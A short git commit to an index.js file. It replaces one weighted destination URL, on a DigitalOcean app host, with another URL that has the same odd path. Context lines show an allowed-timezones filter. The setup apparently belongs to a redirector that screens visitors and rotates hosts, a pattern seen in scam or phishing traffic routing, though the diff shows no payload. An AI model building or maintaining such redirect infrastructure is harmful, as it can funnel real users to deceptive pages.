18e966c5d4407028a6257ddbaa4de5b26f3fc73a
paalakash <palaksh452@gmail.com>
2026-07-08 06:03:42 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seashell-app-xzt9s.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://shark-app-659uu.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
 
 ];
 
